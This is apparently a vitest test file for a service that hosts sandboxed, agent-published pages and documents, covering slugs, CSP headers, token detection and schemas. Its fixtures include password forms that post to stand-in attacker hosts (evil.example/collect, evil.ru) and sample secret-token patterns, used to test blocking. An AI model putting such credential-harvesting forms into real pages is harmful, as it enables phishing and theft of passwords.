import { describe, expect, it } from 'vitest'

import {
  assembleDocMarkdown,
  checkPageContent,
  checkSectionText,
  docCreateArgumentsSchema,
  docSectionWriteArgumentsSchema,
  feedPagePayloadSchema,
  hasOutwardPasswordForm,
  newPageSlug,
  PAGE_CSP,
  PAGE_PLATFORM_CSP,
  PAGE_READING_CSP,
  PAGE_ROBOTS_TXT,
  pageContentRefused,
  pageHostOf,
  pageLimits,
  pagePublishArgumentsSchema,
  pageResponseHeaders,
  pageSlugSchema,
  pageUrlOf,
  sectionMarkdownProblem,
  slugOfPageHost,
  tokenReasonOf,
} from './index.ts'

const bytes = (text: string) => new TextEncoder().encode(text)
const fixed = (fill: number) => () => new Uint8Array(16).fill(fill)
const slug = newPageSlug(fixed(0xab))

describe('page slug and host', () => {
  it('is 26 characters of lower-case base32 from 16 bytes', () => {
    expect(newPageSlug(fixed(0))).toBe('a'.repeat(26))
    expect(newPageSlug(fixed(0xff))).toBe(`${'7'.repeat(25)}4`)
    expect(slug).toHaveLength(26)
    expect(pageSlugSchema.safeParse(slug).success).toBe(true)
    expect(() => newPageSlug(() => new Uint8Array(15))).toThrow()
  })

  it('differs for different bytes, bit by bit', () => {
    const one = new Uint8Array(16)
    one[15] = 1
    expect(newPageSlug(() => one)).not.toBe(newPageSlug(fixed(0)))
  })

  it('builds one address for the page', () => {
    expect(pageHostOf(slug, 'pages.raditi.ru')).toBe(`${slug}.pages.raditi.ru`)
    expect(pageUrlOf(slug, { baseDomain: 'pages.raditi.ru' })).toBe(
      `https://${slug}.pages.raditi.ru/`,
    )
    expect(pageUrlOf(slug, { baseDomain: 'pages.localhost', scheme: 'http', port: 8092 })).toBe(
      `http://${slug}.pages.localhost:8092/`,
    )
    expect(() => pageHostOf('Short', 'pages.raditi.ru')).toThrow()
    expect(() => pageHostOf(slug, 'Pages.Raditi.ru.')).toThrow()
    expect(() => slugOfPageHost(`${slug}.pages.raditi.ru`, { baseDomain: '' })).toThrow()
    expect(() =>
      slugOfPageHost(`${slug}.pages.raditi.ru`, { baseDomain: 'Pages.Raditi.ru' }),
    ).toThrow()
  })

  it('reads a slug from exactly one label under the base domain', () => {
    const base = { baseDomain: 'pages.raditi.ru' }
    expect(slugOfPageHost(`${slug}.pages.raditi.ru`, base)).toBe(slug)
    expect(slugOfPageHost(`${slug.toUpperCase()}.PAGES.raditi.ru`, base)).toBe(slug)
    for (const host of [
      undefined,
      '',
      'pages.raditi.ru',
      'raditi.ru',
      `${slug}.pages.raditi.ru.`,
      `a.${slug}.pages.raditi.ru`,
      `${slug}.raditi.ru`,
      `${slug}.pages.raditi.ru.evil.ru`,
      `${slug}.pages.raditi.ru:443`,
      `${slug}x.pages.raditi.ru`,
      `user@${slug}.pages.raditi.ru`,
      '45.8.250.117',
    ])
      expect(slugOfPageHost(host, base)).toBeNull()
  })

  it('takes a port only when it is the configured one', () => {
    const dev = { baseDomain: 'pages.localhost', port: 8092 }
    expect(slugOfPageHost(`${slug}.pages.localhost:8092`, dev)).toBe(slug)
    expect(slugOfPageHost(`${slug}.pages.localhost:8093`, dev)).toBeNull()
    expect(slugOfPageHost(`${slug}.pages.localhost`, dev)).toBe(slug)
  })
})

describe('page headers', () => {
  it('sandboxes a page word for word as the brief says', () => {
    expect(PAGE_CSP).toBe(
      "sandbox allow-scripts allow-popups allow-popups-to-escape-sandbox; script-src 'unsafe-inline'; " +
        "default-src 'none'; style-src 'unsafe-inline'; img-src data: blob: https:; " +
        "font-src data: blob: https:; media-src data: blob: https:; connect-src 'none'; " +
        "form-action 'none'; frame-src 'none'; frame-ancestors 'none'; object-src 'none'; " +
        "worker-src 'none'; manifest-src 'none'; base-uri 'none'",
    )
    for (const forbidden of ['allow-same-origin', 'allow-forms', 'allow-top-navigation'])
      expect(PAGE_CSP).not.toContain(forbidden)
  })

  it('runs no script on a reading page or on the platform answers', () => {
    expect(PAGE_READING_CSP).toContain("script-src 'none'")
    expect(PAGE_READING_CSP).not.toContain('allow-scripts')
    expect(PAGE_PLATFORM_CSP).toContain("script-src 'none'")
    expect(PAGE_PLATFORM_CSP).toContain("form-action 'self'")
    expect(PAGE_PLATFORM_CSP).toContain("frame-ancestors 'none'")
  })

  it('carries the common headers and sets no cookie', () => {
    for (const kind of ['html', 'reading', 'platform'] as const) {
      const headers = pageResponseHeaders(kind)
      expect(headers).toMatchObject({
        'X-Content-Type-Options': 'nosniff',
        'Referrer-Policy': 'no-referrer',
        'X-Robots-Tag': 'noindex, nofollow, noarchive',
        'Cross-Origin-Opener-Policy': 'same-origin',
        'Cross-Origin-Resource-Policy': 'same-origin',
      })
      expect(headers['Permissions-Policy']).toMatch(
        /camera=\(\).*microphone=\(\).*geolocation=\(\).*payment=\(\)/,
      )
      expect(Object.keys(headers).map((name) => name.toLowerCase())).not.toContain('set-cookie')
    }
    expect(pageResponseHeaders('platform')['Cache-Control']).toBe('no-store')
    expect(PAGE_ROBOTS_TXT).toBe('User-agent: *\nDisallow: /\n')
  })
})

describe('page content checks', () => {
  it('passes a self-contained page', () => {
    const page =
      '<!doctype html><title>Прайс</title><style>b{color:red}</style><script>1</script><p>Цены'
    expect(checkPageContent(bytes(page))).toEqual({ ok: true })
  })

  it('refuses what is not UTF-8 or too large', () => {
    expect(checkPageContent(new Uint8Array([0xc3, 0x28]))).toEqual({
      ok: false,
      reason: 'not_utf8',
    })
    expect(checkPageContent(new Uint8Array(pageLimits.contentBytes + 1))).toEqual({
      ok: false,
      reason: 'too_large',
    })
  })

  it('refuses a key of a turn before any other token', () => {
    const key = `sk-rdt-${'A'.repeat(43)}`
    expect(checkPageContent(bytes(`<p>${key}</p>`))).toEqual({ ok: false, reason: 'turn_key' })
    expect(tokenReasonOf(`mcp_${'0a'.repeat(32)}`)).toBe('turn_key')
  })

  it('refuses embedded tokens of other services', () => {
    const jwt = ['eyJ' + 'a'.repeat(12), 'eyJ' + 'b'.repeat(12), 'c'.repeat(16)].join('.')
    for (const token of [
      jwt,
      '-----BEGIN RSA PRIVATE KEY-----',
      `ghp_${'a'.repeat(36)}`,
      `glpat-${'b'.repeat(20)}`,
      'AKIAIOSFODNN7EXAMPLE',
      `xoxb-${'1'.repeat(12)}`,
    ])
      expect(checkPageContent(bytes(`<p>${token}</p>`)), token).toEqual({
        ok: false,
        reason: 'embedded_token',
      })
  })

  it('leaves prose that only looks a little like a token', () => {
    expect(tokenReasonOf('Скидка sk-10 на всё, ghp_ в тексте, eyJ без точек')).toBeNull()
  })

  it('refuses a password form that sends elsewhere, not one that stays', () => {
    const form = (action: string) => `<form ${action}><input type="password" name="p"></form>`
    expect(hasOutwardPasswordForm(form('action="https://evil.example/collect"'))).toBe(true)
    expect(hasOutwardPasswordForm(form("action='//evil.example'"))).toBe(true)
    expect(hasOutwardPasswordForm(form('method=post action=javascript:send()'))).toBe(true)
    expect(hasOutwardPasswordForm(form('action="#"'))).toBe(false)
    expect(hasOutwardPasswordForm(form(''))).toBe(false)
    expect(hasOutwardPasswordForm('<form action="https://x.ru"><input type="text"></form>')).toBe(
      false,
    )
    const password = '<input type="password" name="p">'
    expect(
      hasOutwardPasswordForm(`<form data-action="x" action="https://evil.ru">${password}</form>`),
    ).toBe(true)
    expect(
      hasOutwardPasswordForm(
        `<form>${password}<button formaction="https://evil.ru">Войти</button></form>`,
      ),
    ).toBe(true)
    expect(
      hasOutwardPasswordForm(`<form>${password}<input type=submit formaction=//evil.ru></form>`),
    ).toBe(true)
    expect(
      hasOutwardPasswordForm(
        `<input form="f" type="password"><form id="f" action="https://evil.ru"></form>`,
      ),
    ).toBe(true)
    expect(hasOutwardPasswordForm(`<form data-action="https://x.ru">${password}</form>`)).toBe(
      false,
    )
    expect(checkPageContent(bytes(form('action="https://x.ru"')))).toEqual({
      ok: false,
      reason: 'password_form',
    })
  })

  it('checks a section without the values of the client', () => {
    expect(checkSectionText('### Итог\nВсё хорошо')).toEqual({ ok: true })
    expect(checkSectionText(`токен ${`sk-rdt-${'x'.repeat(40)}`}`)).toEqual({
      ok: false,
      reason: 'turn_key',
    })
    expect(checkSectionText('ё'.repeat(pageLimits.sectionBytes))).toEqual({
      ok: false,
      reason: 'too_large',
    })
  })

  it('tells the agent the reason, never the content', () => {
    const error = pageContentRefused('client_value')
    expect(error.code).toBe('PAGE_CONTENT_REFUSED')
    expect(error.details).toEqual({ reason: 'client_value' })
  })
})

describe('documents', () => {
  const doc = {
    title: 'Аудит скорости сайта',
    sections: [
      {
        key: 'summary',
        heading: 'Итог',
        markdown: 'Три причины.\r\n\r\n### Подробнее\nТекст',
        intent: 'Итог',
        state: 'written' as const,
      },
      {
        key: 'sources',
        heading: 'Источники',
        markdown: '- https://example.ru/\n',
        intent: 'Источники',
        state: 'written' as const,
      },
    ],
  }

  it('assembles one Markdown for the download, the version and the reading page', () => {
    expect(assembleDocMarkdown(doc)).toBe(
      '# Аудит скорости сайта\n\n## Итог\n\nТри причины.\n\n### Подробнее\nТекст\n\n## Источники\n\n- https://example.ru/\n',
    )
  })

  it('checks the form of the sections again on assembly', () => {
    const broken = { ...doc, sections: [{ ...doc.sections[0]!, markdown: '## Чужой уровень' }] }
    expect(() => assembleDocMarkdown(broken)).toThrow(
      expect.objectContaining({ code: 'DOC_SECTION_INVALID' }),
    )
  })

  it('refuses a document with a pending section', () => {
    const pending = {
      ...doc,
      sections: [
        ...doc.sections,
        { key: 'more', heading: null, markdown: null, intent: 'Ещё', state: 'pending' as const },
      ],
    }
    expect(() => assembleDocMarkdown(pending)).toThrow(
      expect.objectContaining({ code: 'DOC_PENDING_SECTIONS' }),
    )
  })

  it('keeps headings of a section at the third level, outside code too', () => {
    expect(sectionMarkdownProblem('### Хорошо\n#### Тоже')).toBeNull()
    expect(sectionMarkdownProblem('## Раздел в разделе')).toBe('heading_level')
    expect(sectionMarkdownProblem('# Второе название')).toBe('heading_level')
    expect(sectionMarkdownProblem('```sh\n# comment\n```\nТекст')).toBeNull()
    expect(sectionMarkdownProblem('#хештег')).toBeNull()
  })
})

describe('tool arguments', () => {
  const pageId = '0197a2b4-1c2d-7e3f-8a9b-0c1d2e3f4a5b'

  it('publishes from a file or from a document, never both', () => {
    expect(
      pagePublishArgumentsSchema.safeParse({ file: 'прайс.html', title: 'Прайс' }).success,
    ).toBe(true)
    expect(
      pagePublishArgumentsSchema.safeParse({ file: 'p.html', title: 'П', pageId }).success,
    ).toBe(true)
    expect(pagePublishArgumentsSchema.safeParse({ docId: pageId }).success).toBe(true)
    expect(
      pagePublishArgumentsSchema.safeParse({ docId: pageId, file: 'p.html', title: 'П' }).success,
    ).toBe(false)
    expect(pagePublishArgumentsSchema.safeParse({ file: '../p.html', title: 'П' }).success).toBe(
      false,
    )
    expect(
      pagePublishArgumentsSchema.safeParse({ file: 'p.html', title: 'два\nстроки' }).success,
    ).toBe(false)
  })

  it('creates a skeleton of unique sections', () => {
    const sections = [{ id: 'summary', intent: 'Итог: три причины' }]
    expect(docCreateArgumentsSchema.safeParse({ title: 'Отчёт', sections }).success).toBe(true)
    expect(
      docCreateArgumentsSchema.safeParse({ title: 'Отчёт', sections: [...sections, ...sections] })
        .success,
    ).toBe(false)
    expect(docCreateArgumentsSchema.safeParse({ title: 'Отчёт', sections: [] }).success).toBe(false)
    expect(
      docCreateArgumentsSchema.safeParse({
        title: 'Отчёт',
        sections: [{ id: 'Bad Id', intent: 'x' }],
      }).success,
    ).toBe(false)
  })

  it('writes a section by id, its headings from the third level', () => {
    const write = { docId: pageId, id: 'summary', heading: 'Итог', markdown: '### Почему\nТекст' }
    expect(docSectionWriteArgumentsSchema.safeParse(write).success).toBe(true)
    expect(docSectionWriteArgumentsSchema.safeParse({ ...write, after: null }).success).toBe(true)
    expect(
      docSectionWriteArgumentsSchema.safeParse({ ...write, markdown: '## Почему' }).success,
    ).toBe(false)
    expect(docSectionWriteArgumentsSchema.safeParse({ ...write, extra: 1 }).success).toBe(false)
  })
})

describe('feed rows', () => {
  it('name a page by its slug and its version', () => {
    const row = {
      v: 1,
      pageId: '0197a2b4-1c2d-7e3f-8a9b-0c1d2e3f4a5b',
      slug,
      title: 'Прайс',
      version: 3,
      kind: 'html',
    }
    expect(feedPagePayloadSchema.parse(row)).toEqual(row)
    expect(feedPagePayloadSchema.safeParse({ ...row, version: 0 }).success).toBe(false)
    expect(feedPagePayloadSchema.safeParse({ ...row, url: 'https://x' }).success).toBe(false)
  })
})

describe('the address of the pages', () => {
  it('is https in production and carries a port elsewhere only', async () => {
    const { pagesAddressFromEnv, pageAddressUrl } = await import('./address.ts')
    const problems: string[] = []
    const production = pagesAddressFromEnv({ PAGES_BASE_DOMAIN: 'pages.raditi.ru' }, true, problems)
    expect(production).toEqual({ baseDomain: 'pages.raditi.ru', scheme: 'https' })
    expect(pageAddressUrl(slug, production!)).toBe(`https://${slug}.pages.raditi.ru/`)
    const dev = pagesAddressFromEnv(
      { PAGES_BASE_DOMAIN: 'pages.localhost', PAGES_PUBLIC_PORT: 8092 },
      false,
      problems,
    )
    expect(pageAddressUrl(slug, dev!)).toBe(`http://${slug}.pages.localhost:8092/`)
    expect(problems).toEqual([])
    expect(pagesAddressFromEnv({}, false, problems)).toBeNull()
    pagesAddressFromEnv(
      { PAGES_BASE_DOMAIN: 'pages.raditi.ru', PAGES_PUBLIC_PORT: 443 },
      true,
      problems,
    )
    pagesAddressFromEnv({ PAGES_PUBLIC_PORT: 8092 }, false, problems)
    expect(problems).toEqual([
      'PAGES_PUBLIC_PORT: not in production (a page host carries no port there)',
      'PAGES_PUBLIC_PORT: needs PAGES_BASE_DOMAIN',
    ])
  })
})

describe('the words of the documents in the feed', () => {
  it('agree with the number of sections sent back', async () => {
    const { feedDocLeftText } = await import('../tasks/client-feed-labels.ts')
    expect(feedDocLeftText({ sections: 1 })).toBe(
      '1 раздел документа не прошёл проверку и снова пуст. Попросите агента написать его ещё раз.',
    )
    expect(feedDocLeftText({ sections: 21 })).toMatch(/^21 раздел документа не прошёл/)
    expect(feedDocLeftText({ sections: 2 })).toBe(
      '2 раздела документа не прошли проверку и снова пусты. Попросите агента написать их ещё раз.',
    )
    expect(feedDocLeftText({ sections: 5 })).toMatch(/^5 разделов документа не прошли/)
  })
})
